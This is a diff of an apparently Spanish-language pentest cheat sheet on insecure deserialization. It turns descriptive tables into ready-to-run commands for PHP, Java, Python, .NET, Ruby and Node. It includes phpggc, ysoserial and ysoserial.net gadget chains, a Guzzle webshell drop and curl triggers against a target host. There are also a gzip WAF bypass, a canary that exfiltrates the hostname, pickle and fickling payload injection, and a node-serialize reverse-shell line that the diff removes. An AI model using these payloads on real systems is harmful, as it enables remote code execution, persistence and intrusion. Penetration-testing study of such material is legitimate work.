@@ -24,19 +24,17 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Estructura serializada | `O:8:"ClassName":N:{s:4:"prop";s:5:"value";...}` | `O` object, `s` string, `i` int, `a` array. |
-| Magic methods relevantes | `__wakeup` / `__destruct` / `__toString` / `__call` / `__get` / `__set` | Triggers cuando el objeto se hidrata o se referencia. |
-| Force `__destruct` trigger | Forge objeto cuya destructor llama función peligrosa | Se dispara al terminar el script. |
-| Force `__wakeup` trigger | `__wakeup()` se ejecuta justo después de `unserialize()` | Inmediato. |
-| Bypass `__wakeup` (CVE-2016-7124) | PHP < 5.6.25 / 7.0.10 — usar count incorrecto en serializado | `O:4:"User":2:{...}` cuando hay 1 prop → __wakeup no se llama. |
-| POP chain manual | Encadenar magic methods de varias clases para llegar a sink (system / eval / file_put_contents). | Necesita auditar source PHP. |
-| RCE via Phar | `phar://path/file.phar` activa unserialize del Phar metadata. | LFI + Phar = unserialize sin que app llame `unserialize()`. |
-| Webshell drop | Gadget que llama `file_put_contents('/var/www/sh.php', '<?=$_GET[c]?>')` | Persistencia. |
-| Symfony / Laravel chains | Frameworks con `__destruct` en classes accesibles desde autoloader | Usar phpggc. |
-| WordPress / Magento gadgets | Vendor classes en `vendor/` | phpggc tiene chains pre-hechas. |
-| Cookie tampering | Cookie con serializado controlado | App: `unserialize($_COOKIE['user'])`. |
-| Param tampering | Param GET/POST con serializado | App: `unserialize($_POST['data'])`. |
-| Generación con phpggc | `phpggc Monolog/RCE1 system "id"` | Ver `Insecure Deserialization - Tooling`. |
+| `phpggc Monolog/RCE1 system "id"` | Forge serialized payload con gadget chain Monolog → RCE | App con Monolog en classpath. |
+| `phpggc Laravel/RCE9 system "id"` | Laravel gadget chain RCE | Laravel app. |
+| `phpggc WordPress/RCE1 system "id"` | WordPress gadget chain RCE | WP plugin / theme deser. |
+| `phpggc Symfony/RCE1 system "id"` | Symfony gadget chain | Symfony app. |
+| `phpggc Guzzle/FW1 /var/www/html/sh.php '<?=\`$_GET[c]\`?>'` | Webshell drop via Guzzle file write gadget | Persistencia. |
+| `phpggc -b Monolog/RCE1 system "id"` | Output base64 ready para inject | Cookie/header transport. |
+| `phpggc -u Monolog/RCE1 system "id"` | URL-encoded output | Inyección en GET param. |
+| `phpggc -p phar -pj img.jpg Monolog/RCE1 system "id" -o evil.phar` | Phar polyglot — LFI + Phar trigger | Combo file upload + LFI. |
+| `curl -b "user=$(phpggc -b Monolog/RCE1 system 'id')" https://target/` | Trigger via cookie | App con `unserialize($_COOKIE['user'])`. |
+| `curl -d "data=$(phpggc -u Monolog/RCE1 system 'id')" https://target/` | Trigger via POST body | App con `unserialize($_POST['data'])`. |
+| `O:4:"User":2:{...una sola prop...}` (count incorrecto) | Bypass `__wakeup` (CVE-2016-7124) | PHP < 5.6.25 / 7.0.10. |
 ^deser-php
 
 ### Ejemplo POP chain manual
@@ -64,19 +62,16 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Sink primario | `ObjectInputStream.readObject()` | Default vulnerable sin filter. |
-| Header serializado | `0xACED 0x0005` (b64: `rO0ABXNy...`) | Confirma stream Java. |
-| Generador estándar | `java -jar ysoserial.jar <Gadget> "<cmd>"` | Toda la lib en una herramienta. |
-| Gadget CommonsCollections1-7 | `ysoserial CommonsCollections5 "id"` | Apache Commons Collections. |
-| Gadget CommonsBeanutils | `ysoserial CommonsBeanutils1 "id"` | Spring + Beanutils común. |
-| Gadget Spring1/Spring2 | `ysoserial Spring1 "id"` | Spring framework. |
-| Gadget Hibernate | `ysoserial Hibernate1 "id"` | Apps con ORM Hibernate. |
-| Gadget JBossInterceptors | `ysoserial JBossInterceptors1 "id"` | JBoss EAP. |
-| Gadget URLDNS (probe) | `ysoserial URLDNS "http://canary.oast.fun/"` | No-RCE, solo confirma deser activa. |
-| Gadget JRMPClient/JRMPListener | RMI over HTTP — más raro. | Stack legacy. |
-| `Content-Type: application/x-java-serialized-object` | Endpoint que acepta serial directo | RMI, JMX, RMI-IIOP. |
-| Wrap en GZip | Si filtro escanea `aced0005` directo, gzip-comprimir antes de b64. | Algunos parsers descomprimen auto. |
-| Gadget allowlist bypass (JEP 290) | Clases permitidas + filtros — usar `LookAndFeel` o `BeanContextSupport` | Bypass de jdk.serialFilter. |
+| `java -jar ysoserial-all.jar URLDNS "http://canary.oast.fun/" \| base64 -w0` | Canary payload — confirma deser activa sin RCE | Initial probe. |
+| `java -jar ysoserial-all.jar CommonsCollections5 "id" > rce.bin` | Apache Commons Collections RCE | Commons Collections en classpath. |
+| `java -jar ysoserial-all.jar CommonsBeanutils1 "id"` | Commons Beanutils gadget | Spring + Beanutils. |
+| `java -jar ysoserial-all.jar Spring1 "id"` | Spring framework gadget | Spring core. |
+| `java -jar ysoserial-all.jar Hibernate1 "id"` | Hibernate ORM gadget | Apps con Hibernate. |
+| `java -jar ysoserial-all.jar JBossInterceptors1 "id"` | JBoss EAP gadget | JBoss stack. |
+| `java -jar ysoserial-all.jar Groovy1 "id"` | Groovy en classpath gadget | Groovy lib presente. |
+| `curl -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary @rce.bin https://target/api/deser` | Direct POST raw binary | RMI / JMX endpoints. |
+| `gzip -c rce.bin \| base64 -w0 \| curl -d @- https://target/api/x` | Wrap gzip + base64 → bypass WAF que filtra `aced0005` | WAF magic bytes filter. |
+| `java -jar ysoserial-all.jar URLDNS "http://canary.oast.fun/$(hostname)"` | Canary con host info exfil | Blind detection + recon. |
 ^deser-java
 
 ### Workflow Java
@@ -101,19 +96,14 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Sink primario | `pickle.loads()` / `cPickle.loads()` / `pickle.load()` | RCE inmediato. |
-| Magic method | `__reduce__` retorna `(callable, args)` → ejecuta al deserializar. | Mecanismo declarativo. |
-| Payload mínimo | `class E: \n  def __reduce__(self): return (os.system, ('id',))` + `pickle.dumps(E())` | Boilerplate base. |
-| Header pickle | `0x80 0x04` (proto 4) / `0x80 0x05` (proto 5) | Magic byte primer. |
-| Pickle base64 | `pickle.dumps + base64.b64encode` | Para transport en cookies/JSON. |
-| ML pickle (joblib / sklearn) | Models `.pkl` / `.joblib` | Carga de modelo = ejecución del payload. |
-| `numpy.load(allow_pickle=True)` | NumPy pre-1.16.3 default = True | Vector menos conocido. |
-| `pandas.read_pickle()` | Pandas DataFrame | Mismo riesgo. |
-| `dill` / `cloudpickle` | Forks de pickle más permisivos | Mismas vulnerabilidades. |
-| `shelve` / `dbm` | DB-like que usa pickle internamente | Mismo vector. |
-| Restricted unpickler bypass | Si lib usa `Unpickler.find_class` filter | Bypass con módulos no listados. |
-| `fickling` | `fickling --check ./model.pkl` | Análisis estático sin ejecutar. |
-| `fickling` exploit | `fickling --inject 'os.system("id")' ./benign.pkl` | Inyectar código en pickle existente. |
+| `python3 -c "import pickle,os,base64; class E:\n def __reduce__(s): return (os.system,('id',))\nprint(base64.b64encode(pickle.dumps(E())).decode())"` | Forge payload pickle base64 con __reduce__ | Backend con pickle deser. |
+| `fickling --create 'os.system(\"id\")' evil.pkl` | Crear archivo pickle malicioso | Sin Python script custom. |
+| `fickling --inject 'os.system(\"id\")' benign.pkl > evil.pkl` | Inyectar código en archivo pickle existente | ML model file vector. |
+| `fickling --check evil.pkl` | Análisis estático — verifica opcodes peligrosos sin ejecutar | Audit pre-attack. |
+| `curl -X POST -H "Cookie: user=$PAYLOAD_B64" https://target/` | Trigger via cookie | Cookie deser. |
+| `curl -X POST --data-binary "@evil.pkl" https://target/api/load` | Direct POST archivo binario | API que carga pickle. |
+| Upload `.pkl` o `.joblib` malicioso a endpoint que carga ML model | RCE via ML model load | App con `joblib.load()` o `pandas.read_pickle()`. |
+| `python3 -c "import yaml; yaml.load('!!python/object/apply:os.system [\"id\"]', Loader=yaml.Loader)"` | Test YAML.load RCE local | Backend con `yaml.load()`. |
 ^deser-python
 
 ### Payload Python mínimo
@@ -136,19 +126,14 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Sink primario | `BinaryFormatter.Deserialize()` / `LosFormatter` / `ObjectStateFormatter` / `NetDataContractSerializer` / `SoapFormatter` | Múltiples APIs vulnerables. |
-| Generador estándar | `ysoserial.net.exe -g <Gadget> -f <Formatter> -c "<cmd>"` | Equivalente .NET de ysoserial. |
-| Gadget TextFormattingRunProperties | `-g TextFormattingRunProperties -f BinaryFormatter -c "calc"` | Default reliable. |
-| Gadget TypeConfuseDelegate | Bypass de filtros de tipo | Gadget potente. |
-| Gadget WindowsClaimsIdentity | .NET Framework 4.7+ | Específico. |
-| Formatter BinaryFormatter | `-f BinaryFormatter` | El más común. |
-| Formatter LosFormatter (ViewState) | `-f LosFormatter` | ASP.NET ViewState. |
-| Formatter ObjectStateFormatter | `-f ObjectStateFormatter` | ViewState moderno. |
-| Formatter Json.Net | `-f Json.Net` | Newtonsoft con TypeNameHandling. |
-| ViewState exploit (no MAC) | `ysoserial.net -p ViewState -g TextFormatting -c "calc" --path="/page.aspx"` | Si MAC desactivado. |
-| ViewState exploit (con MAC key) | `--validationkey=<hex> --validationalg=SHA1` | Necesita key del web.config. |
-| `.NET deser via JSON.NET` | `{"$type":"System.IO.FileInfo, mscorlib","fileName":"..."}` | TypeNameHandling = All / Auto. |
-| Gadget allowlist bypass | `--allowlist-bypass` flag | Para SerializationBinder strict. |
+| `ysoserial.net.exe -g TextFormattingRunProperties -f BinaryFormatter -c "calc"` | RCE via TextFormattingRunProperties + BinaryFormatter | Default reliable .NET. |
+| `ysoserial.net.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc"` | Bypass type filters via TypeConfuseDelegate | Filtros de tipo. |
+| `ysoserial.net.exe -g ObjectDataProvider -f Json.Net -c "calc"` | RCE via JSON.NET + TypeNameHandling | Newtonsoft.Json con TypeNameHandling. |
+| `ysoserial.net.exe -g WindowsClaimsIdentity -f BinaryFormatter -c "calc"` | .NET 4.7+ specific gadget | Modern .NET. |
+| `ysoserial.net.exe -p ViewState -g TextFormattingRunProperties -c "calc" --path="/test.aspx" --apppath="/"` | ViewState exploit (sin MAC) | ASP.NET con MAC desactivado. |
+| `ysoserial.net.exe -p ViewState -g TextFormattingRunProperties -c "calc" --path="/test.aspx" --validationkey="HEX" --validationalg="SHA1" --decryptionkey="HEX" --decryptionalg="AES"` | ViewState exploit con keys del web.config | Keys leaked / IIS short URL. |
+| `curl -X POST -d "__VIEWSTATE=$PAYLOAD" https://target/page.aspx` | Trigger ViewState payload via POST | ASP.NET endpoint. |
+| `curl -X POST -H "Content-Type: application/json" -d '{"$type":"System.IO.FileInfo, mscorlib","fileName":"path"}' https://target/api/deser` | Direct JSON.NET TypeNameHandling abuse | TypeNameHandling=All. |
 ^deser-dotnet
 
 ### ViewState exploit completo
@@ -178,17 +163,11 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Sink Marshal | `Marshal.load()` / `Marshal.restore()` | RCE directo si input controlado. |
-| Sink YAML | `YAML.load()` (pre 3.1) / `Psych.load` (pre 3.1) | RCE en versiones viejas. |
-| Marshal magic | `0x04 0x08` | Confirma Marshal. |
-| Gadget Rails 4.x (CVE-2013-0156) | YAML load arbitrary classes | Histórico. |
-| Gadget universal Rails (universalrxss) | Disponible en `universalrxss` por Frohoff | Universal Ruby gadget. |
-| ERB injection via Marshal | Forge `ERB.new("<%= cmd %>")` | Runtime template eval. |
-| Magic methods Ruby | `_load` / `marshal_dump` / `marshal_load` | Análogos a __wakeup PHP. |
-| YAML.safe_load | Si usa safe_load → bypass via permitted_classes | A veces poorly configured. |
-| Sinatra / Rails session | `_session_id` cookie con Marshal | Session hijack + deser. |
-| Generador | No hay tool standard tipo ysoserial — armar manual | Más artesanal. |
-| Universal Ruby (CVE-2013-0156) | `--- !ruby/object:ERB instance_variables: ...` | YAML payload Rails. |
+| `ruby -e "require 'erb'; puts Marshal.dump(ERB.new('<%= \`id\` %>'))"` | Forge Marshal payload con ERB injection | App con `Marshal.load()`. |
+| `curl -b "session=$(ruby -e '...' \| base64 -w0)" https://target/` | Cookie Marshal trigger | Sinatra/Rails session cookie. |
+| `curl -X POST -d "$(cat universalrxss.yml)" https://target/api/yaml` | Universal Ruby gadget YAML (CVE-2013-0156) | Rails legacy. |
+| `curl -X POST -H "Content-Type: application/x-yaml" --data-binary "$(cat payload.yml)" https://target/` | YAML.load RCE | Rails con YAML deser. |
+| Upload `.yml` con `--- !ruby/object:ERB src: ...` | YAML deser via file upload | App carga YAML files. |
 ^deser-ruby
 
 ### Payload Ruby YAML clásico
@@ -216,17 +195,11 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Lib vulnerable | `node-serialize` (npm) `<= 0.0.4` | `unserialize()` ejecuta IIFE. |
-| Sink | `serialize.unserialize()` | Llama a `eval()` en strings con `_$$ND_FUNC$$_`. |
-| Marker IIFE | `_$$ND_FUNC$$_function(){...}()` | Función auto-invocada. |
-| Payload RCE básico | `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(err,stdout){console.log(stdout)})}()"}` | Standalone exec. |
-| Reverse shell payload | `_$$ND_FUNC$$_function(){require('child_process').exec('bash -c "bash -i &> /dev/tcp/IP/PORT 0>&1"')}()` | Reverse shell directo. |
-| Lib `funcster` | Mismo patrón que `node-serialize` | Variante. |
-| Lib `serialize-to-js` | Vulnerable similar | CVE-2017-5954. |
-| Cookie tampering | App: `serialize.unserialize(req.cookies.profile)` | Sink en cookie parser. |
-| Body tampering | App: `serialize.unserialize(req.body)` | Sink en POST handler. |
-| Combinar con prototype pollution | Algunos sinks deser permiten prototype pollution chain. | Ver atomics relacionados. |
-| Express session | `connect.sid` con Marshal-like | Si app usa custom serialization. |
+| `node -e "const s=require('node-serialize'); console.log(s.serialize({rce:function(){...gadget...}}))"` luego agregar `()` al final del IIFE | Forge IIFE payload Node | `node-serialize` ≤ 0.0.4. |
+| `curl -X POST -H "Content-Type: application/json" -d '{"profile":"_$$ND_FUNC$$_function(){<gadget>}()"}' https://target/api/x` | Inject IIFE via JSON | Backend `serialize.unserialize(req.body)`. |
+| `curl -b "profile=_\$\$ND_FUNC\$\$_function()<gadget>()" https://target/` | Cookie-based Node deser | Cookie parser + node-serialize. |
+| `npm audit \| grep -E 'serialize-to-js\|node-serialize\|funcster'` | Audit dependencies | Pre-attack discovery. |
+| Combine con prototype pollution: `{"__proto__":{"polluted":"yes"}}` post-deser RCE | Multi-vector chain | Stack vulnerable a both. |
 ^deser-node
 
 ### Payload Node.js completo
